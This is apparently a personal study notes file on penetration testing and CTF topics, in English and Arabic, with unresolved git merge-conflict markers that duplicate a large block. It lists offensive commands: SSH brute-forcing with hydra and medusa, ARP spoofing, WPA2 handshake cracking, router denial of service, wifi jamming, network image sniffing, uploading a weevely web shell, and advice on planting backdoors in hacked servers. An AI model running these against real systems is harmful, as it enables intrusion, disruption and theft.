<<<<<<< HEAD

attack types:
- Dictionary Attack=Wordlist attack==straight mode
- brute force attack (تخمين) dictionary attack
- DOS attack (حجب الخدمة)
- evil twin attack linset improved to -> Fluxion
- MITM (Man In The Medile) Attack
- inside & outside attack
 

SQL injection
XSS
-----------------------------------------------------------------------------------------------------

bcmon
nexmon

ARP table
arp spoofing === ARP Poisoning
Phishing -> تصيد (fake site)
scam
rainbow table
deauth packets
apt-get install miniupnpc; upnpc -a <your_ip> <port> <port_again> TCP;
IP
MAC address
Broadcast = 19.
Gateway = 192.168.1.1 -> ruter IP
port
socket = IP + port
wep: (Wifite – Fern Wifi Cracker) (64bit = 5:10) (128bit = 13:26 char) (fixed key)
wpa / wpa2: (256bit = 8:63 char) (Dynamic keys among router and clients)
wpa3:
wps:  pin (fixed) (8 char) tools:(Reaver === Bully)


status code

https://canyouseeme.org/
https://stalkscan.com/


-----------------------------------------------------------------------------------------------------
- hashcat -> hashing
  - jonn
- Nmap -> network scan
  - nc (netcat)
  - wireshark
- AirCrack-ng suite
- MDK3 && MDK5
- RouterSploit
  - 
- Metasploit framework
- macchanger
- vpn
- proxy chain
-----------------------------------------------------------------------------------------------------




- metasaploit framework [msf]
- msfvenom = {msf payload + msf encoder}


fcrackzip brute force at zip files
---------------------------------------------------------------------------------------------------------------------
CLI
=====
- wifite2
- 
- nmap: port scanning
- hydra -l <username> -P <wordlist_path> -t 4 192.1681.1.7 ssh: brute force -> password list === medusa -h 192.168.1.7 -M ssh -u <username> -p === ncrack -v(verbose) -u <user>|| -U <file> -p <wordlist>
/usr/share/wordlists/nmap.lst:
- dirb: scan directories name by using wordlist


- netdiscover: -r(--range)192.168.1.0/24 -> network watcher 
- arpspoof -i(interface) -t(target) <router_ip> -> netcut
- hash-identifier: -> to know hash type
- hashcat (GPU & CPU)=== john(CPU only): --show <file_name>; -> brute force at hashing = Hash Buster
- wpscan: -> wordpress scan || https://wpscans.com/
- weevely generate <path>:/home/donwloads/shell.php <password>:123456 -> upload it at the website -> weevely http://192.168.1.104/uploud_files/shell.php 123456



- crunch 8 8 -o /home/pass.lst : generate password list
- cupp :generate password list using social engineering

- besside-ng <network_interface_name> : wifi handshake ==airdump-ng

- aircrack-ng -a2(wpa2) -w(wordlist_file) /root/wordlist.lst /handshake.cap


- airmon-ng     :: airmon start wlan0
- mdk3 <interface> -i-> doss attack on routers

websploit
wifi/wifi_jammer
show options
set ESSID mostafa .....
run
pentestbox  hack tools in windows
---------------------------------------------------------------------------------------------------------------------
GUI
====
- zenmap (nmap)
- sparta (nmap & hidera)
- DirBuster (dirb)
- johnny (john)
- vega
- casefile
---------------------------------------------------------------------------------------------------------------------


maltego


- https://www.vulnhub.com


andorid
======
WIBR+ -> hydra an d madusa

route -n
ettercap





تستطيع استخدام هذه الأداة بدون الحاجة إلى ettercap  
driftnet -i eth0 -a -p -d /root/Desktop/Pictures -v
هذا الأمر سيقوم بالتقاط الصور على مستوى الشبكة كاملة 
eth0 : كرت الشبكة الموجود 
/root/Desktop/Pictures : المسار الذي سيقوم البرنامج بحفظ الصور الملتقطة﻿




أخي هل من أدات قوية تخمن على كلمة سر الشبكة بدون ورد ليست فقط بالهاندشاك﻿
اجل بتوزيعه wifislax يوجد  اداة Brutushack 

Spoofing إنتحال


ال BACKDOOR وببساطه بيقوم بفتح SSH حتى يمكنك من عمل مدخل الى النظام.

فرضا لو انك استغرقت يومين باختراق سيرفر شركه و تعبت عليه اكيد مش رح تعيد كل اشي اذا حبيت ترجع تخترقو لا انت بتعمل backdoor عشان تكون العمليه اسرع
يعني بتلخص عمل ال backdoors:
-تامين المدخل 
-تنفيذ ال payloads والاوامر
-وتسمحلك بالدخول


دي حاجة اسمها Mixed Content نتيجة اني ممكن يكون الموقع كان شغال HTTP و بعدين ركبوا HTTPS فاللي حصل انوا طلعلك تحذير اني الموقع كلوا مش HTTPS بس كدة connection is not fully secured



Hakers keylogger

shodan
inssider



-------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------
--help. Next to that, the 7zip-package contains extensive documentation. Look for examples.txt


> Cyber Security:
- Creaptography
- pentration testing
- 





-------------------------------------------------------------------------------------------------------------








as well as Solaris and even eComStation 2








https://www.youtube.com/channel/UCNtcxh_If5xsZ7mFTGV-0pQ/videos




Steganography










> [PentesterAcademy](https://):
- Python for Penetration Testers








Books:
- practical malware analysis






ESSID: network name
BSSID: router MAC address


wifi:
- cupture handshake and brute force 
- evil twin
- brute force at router admin panal



 Kodachi vs Tails 


microsoft web server : iis



nmap -sS<running_servise_name> -O<opreating_sys_type> -p-<open_ports> -A<run_services> -v<verbose> -oX result.xml -T4 192.168.1.11

=======
Cyber Security
===
[cybertalents](cybertalents.com)
---
### code-injection
- in some cases it  leads to fully compromise the application and all its data.
---
### [Morse code](https://morsecode.world/)

- telecommunication VS communication
- sometimes you will find the text only have 3 words and it keeps repeating.
- the difference is in the time of the signal.
- the dash is much longer in time than dot,the silence represent space.
- note : the standard  morse code  works only for the uppercase english letters and numbers.



https://hubchallenges.s3-eu-west-1.amazonaws.com/Crypto/morse.wav
---
### Cross-Site Scripting (XSS) === HTML injection
- relies on the client side
---
###
- CTF stands for Capture The Flag,This is a type of cybersecurity competitions or games with a purpose to locate a particular piece of text called a flag that may be on the server or behind a web page.Capture The Flag (CTF) competition is simulating the real world scenarios of hacking a remote site or exploiting a vulnerability on a specific application. There are two common types of CTFs:  Jeopardy and Attack-Defence
  - Challenge types
    * Jeopardy CTF type includes problems (challenges) like web, digital forensics, reverse engineering and others. Teams or individuals will gain points for any correct challenge they solve. Points are defined depending on challenges difficulty, challenges labeled as hard will help you to gain more points.
      - Cryptography - This type of challenges include understanding the different encryption algorithms
      - Digital Forensics - This type of challenges include file format analysis, steganography, memory dump analysis, or network packet capture analysis.
      - Reverse Engineering - This type of challenges include the process of taking compiled code like .exe files or .apk or others and trying to convert it back into a more human readable format.
      - Web Security - This type of challenges include discovering vulnerabilities in web applications.
      - Exploitation - This type of challenges include exploiting a service to find the flag, the reverse engineering techniques are also applied here in order to analyse the structure and behaviours of the binaries 
      - Network Security - This type of challenges include analysing traffic data like pcap files and others.
      - Open Source Cyber Intelligence - This type of challenges include using open source tools to gather information.
    * Attack-Defence
      - Here each team has its network of insecure devices (or just one host). Your staff typically has time to repair the infrastructure, and to fix vulnerabilities.So you will defend your own services for defence points , and hack opponents for getting attack points.

---

InfoSec VS CyberSec
---
### Intro to Web Security

* Jobs for web security 
  - Application Penetration Tester
  - Bug bounty hunter
  - Application Security Administrator
  - Source Code Auditor
  - Mobile Security Engineer

cyber security conference that run in August every year in Las Vegas,  the largest gathering for Hackers in the whole world,  No Credit cards, no online booking , Only Cash allowed . Who am I ?


For any info-sec field, you must have good knowledge about Network, Programming, OS, Databases

You might not need to write code in some types of challenges but at least you need to know how to read code and understand it
---

---
### HTML
True or False , htmlentities (convert special characters to its html entity ) can't be exploited to run XSS payload ?


---

---
### introduction-to-cryptography

- Confidentiality + Integrity + Authenticity = CIA
- CIA: is a model designed to guide policies for information security within an organization
- hashing algorithms VS message digests.

---

---
### 28-hash-cracking

```
import hashlib

hash_to_be_cracked = 'f899139df5e1059396431415e770c6dd'

i = 0

plain_value = ''

while 1 :
    
 hash_to_compaire = hashlib.md5(str(i)).hexdigest()

 if hash_to_compaire == hash_to_be_cracked :

     plain_value = str(i)
     break

 i += 1

print plain_value
```
* the code is equvilant to:
  - hashcat -a 0 -m 3 f899139df5e1059396431415e770c6dd

- [Wordlist](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt)
- [john the ripper](https://www.openwall.com/john/)
  - john --wordlist=/path_to_rockyou/rockyou.txt the_file_conatins_the_hash --format=Raw-SHA256
    - you can use --show option to show the hash again without passing 

throw cracking process 
---

---
###
Forensics -> Process of analyzing and investing computer devices, on suspecting that such devices may have been used in a cybercrime


---

---
### 21-netcat
- Netcat is a utility that is able to write and read data across TCP and UDP network connections.
- Netcat can be used as port scanner, a backdoor, a port redirector, a port listener and lots of other cool things too.
---

---
### 10-directory-traversal
- web vulnerability that aims to access data stored outside the web application root folder .This vulnerability can allow an attacker to even access the source code of the application.
### How To Test 


1. find all parts of the application that accept content from the user. e.g. HTTP GET , POST queries , file uploads and HTML forms.

Each operating system uses different path separator:

* UNIX :
  - root path : "/"
  - Path separator: "/"
* Windows OS:
  - root path : ":\"
  - Path separator: "" or "/"
* Mac OS : 
  - root path: ":"
  - Path separator: ":"
---

---
### 8-obfuscation
- obfuscation: Change code from one form to another to prevent attacker from understanding it
- reasons why you may use obfuscation , here are some of them:
  - Prevent others from stealing your code 
  - Avoid attackers understanding the script functionalities and abusing it.
  - Bypassing WAFs(Web application firewall) and security detection system from filtering or detecting your payloads .
- There are several obfuscation methods hence that there are many tools for it.

- obfuscation & Deobfuscation
- JS obfuscation tools:
  - minify
    - remove spaces
    - usually developers use this method as it reduces script file size.
  - [JSF](http://www.jsfuck.com/) -> JS script with just six characters []()!+
  - [Packer obfuscation](https://www.cleancss.com/javascript-obfuscate/index.php) -> all script text and symbols will be stored in a list or dictionary and will be resorted and rebuilded again during the execution process .
  - [obfuscator](https://obfuscator.io/)
  - [examples of difficult obfuscation methods](https://aem1k.com/)
- JS deobfuscation Tools:
  - [JStillery](https://mindedsecurity.github.io/jstillery/) -> performs advanced JS deobfuscation via partial evaluation.
  - [deobfuscate javascript](http://deobfuscatejavascript.com/)
  - [Beautifier.io](https://beautifier.io/)
---

---
### 17-meta-data

---

---
### Wireshark

---


---
### 22
---

---
### javascript



---

---
### What is []
### How To Test
### Tools

---
I act as a middle man to forward requests from different devices to access external resources . I am a ......?
---
###

---

---


---
flag{773F4160||}
0027144B
---
###








































attack types:
- Dictionary Attack=Wordlist attack==straight mode
- brute force attack (تخمين) dictionary attack
- DOS attack (حجب الخدمة)
- evil twin attack linset improved to -> Fluxion
- MITM (Man In The Medile) Attack
- inside & outside attack
 

SQL injection
XSS
-----------------------------------------------------------------------------------------------------

bcmon
nexmon

ARP table
arp spoofing === ARP Poisoning
Phishing -> تصيد (fake site)
scam
rainbow table
deauth packets
apt-get install miniupnpc; upnpc -a <your_ip> <port> <port_again> TCP;
IP
MAC address
Broadcast = 19.
Gateway = 192.168.1.1 -> ruter IP
port
socket = IP + port
wep: (Wifite – Fern Wifi Cracker) (64bit = 5:10) (128bit = 13:26 char) (fixed key)
wpa / wpa2: (256bit = 8:63 char) (Dynamic keys among router and clients)
wpa3:
wps:  pin (fixed) (8 char) tools:(Reaver === Bully)


status code

https://canyouseeme.org/
https://stalkscan.com/


-----------------------------------------------------------------------------------------------------
- hashcat -> hashing
  - jonn
- Nmap -> network scan
  - nc (netcat)
  - wireshark
- AirCrack-ng suite
- MDK3 && MDK5
- RouterSploit
  - 
- Metasploit framework
- macchanger
- vpn
- proxy chain
-----------------------------------------------------------------------------------------------------




- metasaploit framework [msf]
- msfvenom = {msf payload + msf encoder}


fcrackzip brute force at zip files
---------------------------------------------------------------------------------------------------------------------
CLI
=====
- wifite2
- 
- nmap: port scanning
- hydra -l <username> -P <wordlist_path> -t 4 192.1681.1.7 ssh: brute force -> password list === medusa -h 192.168.1.7 -M ssh -u <username> -p === ncrack -v(verbose) -u <user>|| -U <file> -p <wordlist>
/usr/share/wordlists/nmap.lst:
- dirb: scan directories name by using wordlist


- netdiscover: -r(--range)192.168.1.0/24 -> network watcher 
- arpspoof -i(interface) -t(target) <router_ip> -> netcut
- hash-identifier: -> to know hash type
- hashcat (GPU & CPU)=== john(CPU only): --show <file_name>; -> brute force at hashing = Hash Buster
- wpscan: -> wordpress scan || https://wpscans.com/
- weevely generate <path>:/home/donwloads/shell.php <password>:123456 -> upload it at the website -> weevely http://192.168.1.104/uploud_files/shell.php 123456



- crunch 8 8 -o /home/pass.lst : generate password list
- cupp :generate password list using social engineering

- besside-ng <network_interface_name> : wifi handshake ==airdump-ng

- aircrack-ng -a2(wpa2) -w(wordlist_file) /root/wordlist.lst /handshake.cap


- airmon-ng     :: airmon start wlan0
- mdk3 <interface> -i-> doss attack on routers

websploit
wifi/wifi_jammer
show options
set ESSID mostafa .....
run
pentestbox  hack tools in windows
---------------------------------------------------------------------------------------------------------------------
GUI
====
- zenmap (nmap)
- sparta (nmap & hidera)
- DirBuster (dirb)
- johnny (john)
- vega
- casefile
---------------------------------------------------------------------------------------------------------------------


maltego


- https://www.vulnhub.com


andorid
======
WIBR+ -> hydra an d madusa

route -n
ettercap





تستطيع استخدام هذه الأداة بدون الحاجة إلى ettercap  
driftnet -i eth0 -a -p -d /root/Desktop/Pictures -v
هذا الأمر سيقوم بالتقاط الصور على مستوى الشبكة كاملة 
eth0 : كرت الشبكة الموجود 
/root/Desktop/Pictures : المسار الذي سيقوم البرنامج بحفظ الصور الملتقطة﻿




أخي هل من أدات قوية تخمن على كلمة سر الشبكة بدون ورد ليست فقط بالهاندشاك﻿
اجل بتوزيعه wifislax يوجد  اداة Brutushack 

Spoofing إنتحال


ال BACKDOOR وببساطه بيقوم بفتح SSH حتى يمكنك من عمل مدخل الى النظام.

فرضا لو انك استغرقت يومين باختراق سيرفر شركه و تعبت عليه اكيد مش رح تعيد كل اشي اذا حبيت ترجع تخترقو لا انت بتعمل backdoor عشان تكون العمليه اسرع
يعني بتلخص عمل ال backdoors:
-تامين المدخل 
-تنفيذ ال payloads والاوامر
-وتسمحلك بالدخول


دي حاجة اسمها Mixed Content نتيجة اني ممكن يكون الموقع كان شغال HTTP و بعدين ركبوا HTTPS فاللي حصل انوا طلعلك تحذير اني الموقع كلوا مش HTTPS بس كدة connection is not fully secured



Hakers keylogger

shodan
inssider



-------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------
--help. Next to that, the 7zip-package contains extensive documentation. Look for examples.txt


> Cyber Security:
- Creaptography
- pentration testing
- 





-------------------------------------------------------------------------------------------------------------








as well as Solaris and even eComStation 2








https://www.youtube.com/channel/UCNtcxh_If5xsZ7mFTGV-0pQ/videos




Steganography










> [PentesterAcademy](https://):
- Python for Penetration Testers








Books:
- practical malware analysis






ESSID: network name
BSSID: router MAC address


wifi:
- cupture handshake and brute force 
- evil twin
- brute force at router admin panal



 Kodachi vs Tails 


microsoft web server : iis



nmap -sS<running_servise_name> -O<opreating_sys_type> -p-<open_ports> -A<run_services> -v<verbose> -oX result.xml -T4 192.168.1.11

>>>>>>> 4af8c228a1e5f92e035f488b94443d6c889500e6
------------------------------------------------------------------------------------------------------------------------------------------